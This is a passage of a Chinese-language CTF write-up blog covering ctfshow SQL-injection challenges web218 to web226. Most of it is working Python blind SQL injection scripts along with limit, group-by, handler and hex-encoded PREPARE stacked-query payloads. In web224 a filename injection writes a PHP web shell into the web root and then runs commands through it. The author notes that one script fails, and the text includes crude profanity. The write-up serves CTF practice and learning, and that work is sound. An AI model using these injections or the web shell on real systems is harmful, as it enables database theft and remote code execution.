None&quot;&quot;&quot;import timeimport requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;f277bdb1-e417-43a9-a241-8a77c0cdaeff.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;-&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxc&quot;&#39;inside &#x3D; &#39;substr((select group_concat(flagaac) from ctfshow_flagxc),9,36)&#39;payload &#x3D; &quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in range(1, 100):    for j in str:        data &#x3D; &#123;            &#39;ip&#39;: payload.format(inside, i, j),            &#39;debug&#39;: 0        &#125;        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()        time.sleep(1)    print(res)</code></pre><h2 id="Rlike"><a href="#Rlike" class="headerlink" title="Rlike"></a>Rlike</h2><pre class="language-python" data-language="python"><code class="language-python">select rpad(&#39;a&#39;,4999999,&#39;a&#39;) RLIKE concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;);正则语法：. : 匹配任意单个字符* ： 匹配0个或多个前一个得到的字符[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。^ : 匹配开头，如^s匹配以s或者S开头的字符串。$ : 匹配结尾，如s$匹配以s结尾的字符串。&#123;n&#125; : 匹配前一个字符反复n次。RPAD(str,len,padstr)用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len&#39;，那么它将被截除到 len个字符。mysql&gt; SELECT RPAD(&#39;hi&#39;,5,&#39;?&#39;); -&gt; &#39;hi???&#39;repeat(str,times)  复制字符串times次</code></pre><pre class="language-python" data-language="python"><code class="language-python"># -- coding:UTF-8 --# Author:孤桜懶契# Date:2021&#x2F;7&#x2F;31# blog: gylq.gitee.ioimport requestsimport timebypass&#x3D;&quot;concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;&quot;url &#x3D; &quot;http:&#x2F;&#x2F;4f04cb91-f6ed-43ce-bc4d-539d9c5b2a7b.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;flag &#x3D; &quot;&quot;#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1)&#x3D;&#39;c&#39;,( concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;),0)##求表payload &#x3D; &quot;1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,(&#123;&#125;),0)#&quot;#payload &#x3D; &quot;1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagxc&#39;),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,(&#123;&#125;),0)#&quot;payload &#x3D; &quot;1) and  if(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,(&#123;&#125;),0)#&quot;n &#x3D; 0for i in range(0, 666):    for j in str:        data &#x3D; &#123;            &quot;ip&quot;: payload.format(i,j,bypass),            &quot;debug&quot;: &#39;0&#39;        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url, data)        end &#x3D; time.time()        if end - start &gt; 0.4 and end - start &lt; 1:            flag +&#x3D; j            n +&#x3D; 1            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))            print(flag)            if j &#x3D;&#x3D; &quot;&#125;&quot;:                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))                exit()            break</code></pre><h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><pre class="language-python" data-language="python"><code class="language-python">&#x2F;&#x2F;查询语句where id &#x3D; ($id);&#x2F;&#x2F;屏蔽危险分子function waf($str)&#123;    return preg_match(&#39;&#x2F;sleep|benchmark|rlike&#x2F;i&#39;,$str);&#125; </code></pre><p>同上题<br>直接跑就行。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注1.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None&quot;&quot;&quot;import timeimport requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;6c19b909-06f4-412b-ba28-581287b784fc.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxca&quot;&#39;inside &#x3D; &#39;substr((select group_concat(flagaabc) from ctfshow_flagxca),9,36)&#39;payload &#x3D; &quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in range(1, 100):    for j in str:        data &#x3D; &#123;            &#39;ip&#39;: payload.format(inside, i, j),            &#39;debug&#39;: 0        &#125;        # 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()        time.sleep(1)    print(res)</code></pre><h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p>最后一个盲注了，赶紧做完赶紧润。<br>过滤了substr，可以用正则，left都可以。用limit代替group_concat() </p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注2.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 13:25   natro92      1.0         None&quot;&quot;&quot;import timeimport requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;2db91241-b5ab-4eec-9035-df2df4f18a46.challenge.ctf.show&#x2F;api&#x2F;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select table_name from information_schema.tables where table_schema &#x3D; database() limit 0,1&#39;# inside &#x3D; &#39;select column_name from information_schema.columns where table_name &#x3D; &quot;ctfshow_flagxcac&quot; limit 1,1&#39;inside &#x3D; &#39;select flagaabcc from ctfshow_flagxcac&#39;payload &#x3D; &quot;1) or if(left((&#123;&#125;),&#123;&#125;)&#x3D;(&#39;&#123;&#125;&#39;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in range(1, 100):    for j in str:        data &#x3D; &#123;            &#39;ip&#39;: payload.format(inside, i, res + j),            &#39;debug&#39;: 0        &#125;        try:            r &#x3D; requests.post(url, data&#x3D;data, timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()        time.sleep(1)    print(res)</code></pre><p>其他脚本：</p><pre class="language-python" data-language="python"><code class="language-python"># -- coding:UTF-8 --# Author:孤桜懶契# Date:2021&#x2F;8&#x2F;1# blog: gylq.gitee.ioimport requestsimport timebypass&#x3D;&quot;select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f&quot;url &#x3D; &quot;http:&#x2F;&#x2F;d82b1a0b-aba4-4fed-aa83-62d59d7df4ee.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;flag &#x3D; &quot;&quot;#1) and if((database())regexp(&#39;^ctfshow&#39;),(select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f),0)##payload &#x3D; &quot;1) and if((database())regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;#payload &#x3D; &quot;1) and if((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;#payload &#x3D; &quot;1) and if((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagxcac&#39; limit 1,1)regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;payload &#x3D; &quot;1) and if((select flagaabcc from ctfshow_flagxcac limit 0,1)regexp(&#39;^&#123;&#125;&#39;),(&#123;&#125;),0)#&quot;n &#x3D; 0for i in range(0, 666):    for j in str:        data &#x3D; &#123;            &quot;ip&quot;: payload.format(flag + j,bypass),            &quot;debug&quot;: &#39;0&#39;        &#125;        start &#x3D; time.time()        res &#x3D; requests.post(url, data)        end &#x3D; time.time()        if end - start &gt; 3 and end - start &lt; 5:            flag +&#x3D; j            n +&#x3D; 1            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))            print(flag)            if j &#x3D;&#x3D; &quot;&#125;&quot;:                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))                exit()            break</code></pre><h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><blockquote><p><a href="https://www.jb51.net/article/99980.htm"><strong>https://www.jb51.net/article/99980.htm</strong></a></p></blockquote><h3 id="limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入"><a href="#limit注入-MySQL利用procedure-analyse-函数优化表结构-这个题本质就是报错注入" class="headerlink" title="limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入"></a>limit注入 MySQL利用procedure analyse()函数优化表结构 这个题本质就是报错注入</h3><pre class="language-python" data-language="python"><code class="language-python">$sql &#x3D; select * from ctfshow_user limit ($page-1)*$limit,$limit;</code></pre><p>注入点在get处，limit注入使用标准：<br><code>select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</code><br>修改为payload：</p><pre class="language-python" data-language="python"><code class="language-python">?page&#x3D;1&amp;limit&#x3D;1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689329494340-363ae1db-f3a1-4694-9bad-d0ec6cc660b7.png" alt="image.png"><br>直接交数据库名即可</p><h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h3 id="group-by注入"><a href="#group-by注入" class="headerlink" title="group by注入"></a>group by注入</h3><p>直接在group by的位置注入即可</p><pre class="language-python" data-language="python"><code class="language-python">form.on(&#39;submit(*)&#39;, function(data)&#123;    var table &#x3D; layui.table;    table.reload(&#39;user_table&#39;, &#123;      url:&#39;api&#x2F;?u&#x3D;username&#39;    &#125;)    return false;   &#125;);  $sql &#x3D; select * from ctfshow_user group by $username;</code></pre><p>直接用时间盲注即可：<br>测试时会发现sleep的值会被方法二十倍。<br><code>?u=sleep(0.5)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689331879814-ce852ff0-cdee-4a48-9eda-66304003d4b5.png" alt="image.png"><br>然后就使用之前的时间盲注脚本即可。</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL时间盲注1.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 5:20   natro92      1.0         None&quot;&quot;&quot;import timeimport requestsurl &#x3D; r&#39;http:&#x2F;&#x2F;0750fdff-bead-49bc-b6cb-501f23e1457d.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str &#x3D; &quot;_abcdefghijklmnopqrstuvwxyz0123456789,&#123;-&#125; &quot;# inside &#x3D; &#39;database()&#39;# inside &#x3D; &#39;select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()&#39;# inside &#x3D; &#39;select group_concat(column_name) from information_schema.columns where table_name &#x3D; &quot;ctfshow_flaga&quot;&#39;inside &#x3D; &#39;substr((select group_concat(flagaabc) from ctfshow_flaga),1,48)&#39;payload &#x3D; &quot;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),sleep(0.05),1)&quot;res &#x3D; &#39;&#39;last &#x3D; &#39; &#39;for i in range(1, 100):    for j in str:        try:            r &#x3D; requests.post(url&#x3D;url + payload.format(inside, i, j), timeout&#x3D;1)        except Exception as e:            last &#x3D; res            res +&#x3D; j            break        if last &#x3D;&#x3D; res.replace(&#39; &#39;,&#39;&#39;):            exit()    print(res)</code></pre><h1 id="web223（勾吧题，做破防了）"><a href="#web223（勾吧题，做破防了）" class="headerlink" title="web223（勾吧题，做破防了）"></a>web223（勾吧题，做破防了）</h1><p>提示用户名不能用数字，因此可以用true代替，但是用true的代价就是一次循环20s，那就用布尔盲注代替。<br>看了wp发现使用的非常巧妙：<br>exp</p><pre class="language-python" data-language="python"><code class="language-python">if(true,username,false)</code></pre><p>如果返回true时，就会执行<code>group by username</code>，导致参数变多：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334070399-917c5ad2-3dc9-4c8b-b024-ab234ed78616.png" alt="image.png"><br>而false时，返回false字符串，数据就相对较少：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689334102676-c0d798b5-618c-4450-98f9-f1ee4247ba16.png" alt="image.png"><br>因此可以做出盲注，构建脚本:<br>注意，这里过滤了数字1，因此只能用true代替。<br>给我杀了把 傻逼题，勾吧脚本真不知道哪错了：（这个脚本出不来，但是真不想改了）</p><pre class="language-python" data-language="python"><code class="language-python"># -*- encoding: utf-8 -*-&quot;&quot;&quot;@File    :   SQL布尔盲注3.py   @Contact :   2997453446@qq.com@Blog    :   natro92.github.io @Modify Time      @Author    @Version    @Desciption------------      -------    --------    -----------2023&#x2F;7&#x2F;14 19:29   natro92      1.0         None&quot;&quot;&quot;import stringimport requestsimport timedef calculate_true(num):    res &#x3D; &#39;true&#39;    res +&#x3D; (num - 1) * &#39;+true&#39;    # print(res)    return resdef checkNum(s):    if s in string.ascii_lowercase:        return s    elif s in &#39;0123456789&#39;:        return calculate_true(int(s))    else:        return Noneurl &#x3D; r&#39;http:&#x2F;&#x2F;364e23b2-79ce-4183-a604-8d8d1666bd18.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;&#39;flag_pre &#x3D; &#39;ctfshow&#123;&#39;str1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$&#x3D;,;_ -&#125;&quot;inside &#x3D; &quot;database()&quot;# inside &#x3D; &quot;admin&#39;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;# inside &#x3D; &quot;admin&#39;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flxg&#39;),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;# inside &#x3D; &quot;admin&#39;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)&#x3D;(&#39;&#123;&#125;&#39;),1,0)#&quot;payload &#x3D; &#39;if(substr((&#123;&#125;),&#123;&#125;,1)&#x3D;(&quot;&#123;&#125;&quot;),username,false)&#39;res &#x3D; &#39;&#39;for i in range(1,100):    for j in str1:        nurl &#x3D; url        nurl +&#x3D; payload.format(inside, calculate_true(i), checkNum(j)).replace(&#39;1&#39;, &#39;true&#39;) # 1被过滤了，别忘了        r &#x3D; requests.post(nurl)        # print(data)        # print(r.json()[&#39;msg&#39;])        # print(nurl)        # print(r.text)        if &#39;AUTO&#39; in r.text:            res +&#x3D; j            print(res)            if j &#x3D;&#x3D; &#39;&#125;&#39;:                exit()</code></pre><p>看看远处的正确脚本吧：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &#39;http:&#x2F;&#x2F;90b8ab81-6a05-4ebc-ab88-62e8442c0e89.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;&#39;str &#x3D; &#39;&#39;def num2true(num):    str &#x3D; &#39;(&#39; + &#39;true%2b&#39; * (num-1) + &#39;true)&#39;    return stra &#x3D; num2true(1)# print(a)for i in range(1, 60):    min,max &#x3D; 32, 128    while True:        j &#x3D; min + (max-min)&#x2F;&#x2F;2        if(min &#x3D;&#x3D; j):            str +&#x3D; chr(j)            print(str)            break        # 爆表名        # payload &#x3D; f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;        # 爆列        # payload &#x3D; f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagas&#39;),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;        # 爆值        payload &#x3D; f&quot;if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),&#123;num2true(i)&#125;,true))&lt;&#123;num2true(j)&#125;,username,true)&quot;        r &#x3D; requests.get(url&#x3D;url+payload).text        # print(r)        if &#39;passwordAUTO&#39; in r:            max &#x3D; j        else:            min &#x3D; j</code></pre><pre class="language-python" data-language="python"><code class="language-python"># -- coding:UTF-8 --# Author:孤桜懶契# Date:2021&#x2F;8&#x2F;1# blog: gylq.gitee.ioimport requests#import timedef generateNum(num):    res &#x3D; &#39;true&#39;    if num &#x3D;&#x3D; 1:        return res    else:        for i in range(num-1):            res +&#x3D; &quot;+true&quot;        return resurl &#x3D; &quot;http:&#x2F;&#x2F;ce009cf2-8652-4737-ba07-b3bfc3bc3a4a.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;flag &#x3D; &quot;&quot;#*************************************************************************************************************************************************************#--------查表#sql&#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;#--------查字段#sql&#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagas&#39;&quot;#--------查flagsql&#x3D; &quot;select flagasabc from ctfshow_flagas&quot;#*************************************************************************************************************************************************************payload &#x3D; &quot;if(ascii(substr((&#123;&#125;),&#123;&#125;,true))&#x3D;(&#123;&#125;),username,false)&quot;#计数n &#x3D; 0for i in range(1, 666):    for j in range(32,126):        result_num&#x3D;generateNum(i)        result&#x3D;generateNum(j)        params &#x3D; &#123;            &#39;u&#39; : payload.format(sql,result_num,result)        &#125;        res &#x3D; requests.get(url &#x3D; url, params &#x3D; params)        if &quot;userAUTO&quot; in res.text:            flag +&#x3D; chr(j)            n +&#x3D; 1            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))            print(flag)            if j &#x3D;&#x3D; &quot;&#125;&quot;:                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))                exit()            break#ctfshow&#123;728dd1b0-7547-401d-b358-2d2207f3d13c&#125;</code></pre><p>太重量级了，我拼个半天那个测试payload就是不对，true拼接咋拼咋不对，草泥马，傻逼sql注入你妈妈死了。<br>不用asci拼到substr里就是不行。</p><pre class="language-python" data-language="python"><code class="language-python">&#x2F;api&#x2F;?u&#x3D;if(substr((database()),(true),true)&#x3D;(&#39;c&#39;),username,&#39;a&#39;)</code></pre><p>第一个就行<br>第二个就不行</p><pre class="language-python" data-language="python"><code class="language-python">http:&#x2F;&#x2F;000cd6ed-c9e2-47c0-8f98-045fe552c6cd.challenge.ctf.show&#x2F;api&#x2F;?u&#x3D;if(mid((database()),(true+true),(true))&#x3D;(&#39;c&#39;),username,&#39;a&#39;)</code></pre><h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p>似乎不是sql注入，而是文件上传。<br> 实际上robots.txt能扫出来有修改密码的位置，修改密码之后登录是一个文件上传。<img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690440405918-9387ad36-0b95-4e7a-8698-b57c6f13a676.png" alt="20201128094552251.png"><br>文件名注入，写入文件：</p><pre class="language-php" data-language="php"><code class="language-php">C64File &quot;&#39;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;; --+</code></pre><p>保存为：<code>payload.bin</code>其中十六进制为：<code>&lt;?=``$_GET[1]?``&gt;</code>，然后访问1.php传参1RCE。</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;1.php?1&#x3D;cat &#x2F;flag</code></pre><h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h3 id="handler，预处理"><a href="#handler，预处理" class="headerlink" title="handler，预处理"></a>handler，预处理</h3><blockquote><p><a href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a><br><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a> handler官方文档</p></blockquote><p>没过滤show字符：<code>ctfshow&#39;;show tables;</code></p><pre class="language-php" data-language="php"><code class="language-php">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;Tables_in_ctfshow_web&quot;:&quot;ctfshow_flagasa&quot;&#125;,&#123;&quot;Tables_in_ctfshow_web&quot;:&quot;ctfshow_user&quot;&#125;]&#125;</code></pre><p>用handler读取：<code>username=ctfshow&#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;</code></p><pre class="language-php" data-language="php"><code class="language-php">&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\u67e5\u8be2\u6210\u529f&quot;,&quot;count&quot;:1,&quot;data&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;username&quot;:&quot;ctfshow&quot;,&quot;pass&quot;:&quot;ctfshow&quot;&#125;,&#123;&quot;id&quot;:&quot;1&quot;,&quot;flagas&quot;:&quot;ctfshow&#123;83599e7a-ba35-4ce6-88a1-6e1c69755ccb&#125;&quot;,&quot;info&quot;:&quot;you get it&quot;&#125;]&#125;</code></pre><h2 id="至于什么是handler："><a href="#至于什么是handler：" class="headerlink" title="至于什么是handler："></a>至于什么是handler：</h2><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭，使用方法：</p><pre class="language-php" data-language="php"><code class="language-php">&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first#</code></pre><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。　MySQL 预处理语句的支持版本较早，所以我们目前普遍使用的 MySQL 版本都是支持这一语法的。</p><pre class="language-php" data-language="php"><code class="language-php">PREPARE name from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;预定义SQL语句EXECUTE name;  &#x2F;&#x2F;执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  &#x2F;&#x2F;删除预定义SQL        语句</code></pre><p>字符串预处理：</p><pre class="language-php" data-language="php"><code class="language-php">PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;ET @a &#x3D; 3;SET @b &#x3D; 4;                                                   EXECUTE stmt1 USING @a, @b;</code></pre><p>变量定义预处理：</p><pre class="language-php" data-language="php"><code class="language-php">SET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;PREPARE stmt2 FROM @s;SET @c &#x3D; 6;ET @d &#x3D; 8;EXECUTE stmt2 USING @c, @d;DEALLOCATE PREPARE stmt2;</code></pre><p>利用concat绕过过滤，然后将后面的database()替换为需要执行的语句。别忘记中间的空格。<br>payload：</p><pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;ctfshow&#39;;PREPARE aaa from concat(&#39;s&#39;,&#39;elect&#39;, &#39; flagas from ctfshow_flagasa&#39;);EXECUTE aaa;</code></pre><p>或者用concat得到的连接字符也可以代替select：</p><pre class="language-php" data-language="php"><code class="language-php">?username&#x3D;ctfshow&#39;;PREPARE aaa from concat(char(115,101,108,101,99,116), &#39; flagas from ctfshow_flagasa&#39;);EXECUTE aaa;</code></pre><h1 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h1><p>我们之前在web224中的文件上传就使用了转换为十六进制然后将内容前加上0x。再加上预处理。<br>十六进制转换可以这样写：</p><pre class="language-php" data-language="php"><code class="language-php">text &#x3D; &quot;Hello World&quot;hex_str &#x3D; &#39;&#39;for ch in text:    hex_ch &#x3D; hex(ord(ch)).replace(&#39;0x&#39;,&#39;&#39;)    hex_str +&#x3D; hex_chprint(&quot;原文：\n&quot;+text)print(&quot;十六进制（不带0x）：\n&quot;+hex_str)print(&quot;十六进制（带0x）：\n&quot;+&quot;0x&quot;+hex_str)</code></pre><p>我们将需要预编译的语句转换为十六进制。然后再传入比如：<br>show被过滤掉了，不要出现。</p><pre class="language-php" data-language="php"><code class="language-php">十六进制前：select database()转换后：0x73656c6563742064617461626173652829加上预编译语句：ctf&#39;;PREPARE aaa from 0x73656c6563742064617461626173652829;EXECUTE aaa;--+</code></pre><p>然后再将中间的内容转换为需要的查询语句即可。<br>比如：</p><pre class="language-php" data-language="php"><code class="language-php">select table_name from information_schema.tables where table_schema&#x3D;database()?username&#x3D;ctf&#39;;PREPARE aaa from 0x73656c656374207461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;EXECUTE aaa;--+</code></pre><p>查列</p><pre class="language-php" data-language="php"><code class="language-php">select column_name from information_schema.columns where table_name&#x3D;&#39;ctfsh_ow_flagas&#39;?username&#x3D;ctf&#39;;PREPARE aaa from 0x73656c65637420636f6c756d6e5f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE aaa;--+</code></pre><p>查内容</p><pre class="language-php" data-language="php"><code class="language-php">select flagasb from ctfsh_ow_flagas?username&#x3D;ctf&#39;;PREPARE aaa from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE aaa;--+</code></pre><p>就能查到flag了。</p><h1 id="web227、web228-web230"><a href="#web227、web228-web230" class="headerlink" title="web227、web228-web230"></a>web227、web228-web230</h1><blockquote><p><a 